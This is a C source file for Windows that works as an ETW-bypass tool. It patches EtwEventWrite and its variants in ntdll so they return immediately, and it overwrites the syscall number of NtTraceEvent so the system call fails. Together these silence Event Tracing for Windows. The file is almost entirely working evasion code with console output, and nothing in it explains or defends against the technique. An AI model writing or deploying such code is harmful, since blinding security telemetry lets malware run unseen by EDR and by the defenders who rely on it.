//#@z0b1l4l


#include<stdio.h>
#include<windows.h>

#define RET_INSTRUCTION_OPCODE 0XC3
#define MOV_INSTRUCTION_OPCODE 0xB8
#define SYSCALL_SIZE 0x20


typedef enum PATCHFUNC {

	PATCH_ETW_EVENT_WRITE,
	PATCH_ETW_EVENT_WRITE_EX,
	PATCH_ETW_EVENT_WRITE_FULL 
};


BOOL PatchEtwEventWrite(enum PATCHFUNC ePatchFunc) {

	PBYTE pEtwFuncAddr = NULL;
	DWORD dwOldProtection = NULL;
	BYTE pPatchBytes[3] = {
							0X33 , 0XC0,	// xor eax, eax 
							0XC3			// ret 
						  };

	// getting the address of the ETW event write function based on one of the three cases
	pEtwFuncAddr = GetProcAddress(GetModuleHandleA("NTDLL"), 
		(ePatchFunc == PATCH_ETW_EVENT_WRITE) ? "EtwEventWrite" :
		(ePatchFunc == PATCH_ETW_EVENT_WRITE_EX) ? "EtwEventWriteEx" : "EtwEventWriteFull"
	);

	if (!pEtwFuncAddr) {
		printf("[!] GetProcAddress failed with error %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] Address of %s is : 0x%p ", 
		(ePatchFunc == PATCH_ETW_EVENT_WRITE) ? "EtwEventWrite" :
		(ePatchFunc == PATCH_ETW_EVENT_WRITE_EX) ? "EtwEventWriteEx" : "EtwEventWriteFull",
		pEtwFuncAddr);

	getchar();

	// changing the memory permission to insert the patches
	if (!VirtualProtect(pEtwFuncAddr, sizeof(pPatchBytes), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] Patching the bytes ..");
	// write the patch
	memcpy(pEtwFuncAddr, pPatchBytes, sizeof(pPatchBytes));
	printf("[+] DONE !\n");

	// restore the memory permission 
	if (!VirtualProtect(pEtwFuncAddr, sizeof(pPatchBytes), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL PatchNtTraceEvent() {

	PBYTE pNtTraceEventAddr = NULL;
	DWORD dwOldProtection = NULL;

	// get the address of the syscall function
	pNtTraceEventAddr = GetProcAddress(GetModuleHandleA("NTDLL"), "NtTraceEvent");
	if (!pNtTraceEventAddr) {
		printf("[!] GetProcAddress failed with error %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] Address of 'NtTraceEvent' is : 0x%p ", pNtTraceEventAddr);
	getchar();
	// searching for the mov instruction
	for (int i = 0; i < SYSCALL_SIZE; i++) {

		if (pNtTraceEventAddr[i] == MOV_INSTRUCTION_OPCODE) {

			// get the NtTraceEvent' SSN
			pNtTraceEventAddr = (PBYTE)(&pNtTraceEventAddr[i] + 1);
			printf("[+] Address of 'NtTraceEvent' SSN is : 0x%p \n", pNtTraceEventAddr);
			break;
		}

		// if we scape the SSN or we reach to the end
		if (pNtTraceEventAddr[i] == RET_INSTRUCTION_OPCODE || pNtTraceEventAddr[i] == 0x0F || pNtTraceEventAddr[i] == 0x05)
			return FALSE;
	}

	// change the memory permissions
	if (!VirtualProtect(pNtTraceEventAddr, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] Patching the bytes ..");
	// apply the patch with dummy SSN value 0xFF ( in reverse order )
	*(PDWORD)pNtTraceEventAddr = 0x000000FF;
	printf("[+] DONE !\n");
	// restore the original memory permissions
	if (!VirtualProtect(pNtTraceEventAddr, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;

}


int main() {

	/*PatchEtwEventWrite(PATCH_ETW_EVENT_WRITE);
	PatchEtwEventWrite(PATCH_ETW_EVENT_WRITE_EX);
	PatchEtwEventWrite(PATCH_ETW_EVENT_WRITE_FULL);*/

	PatchNtTraceEvent();

	printf("[#] Press < Enter > To Quit ..\n");
	getchar();

	return 0;
}
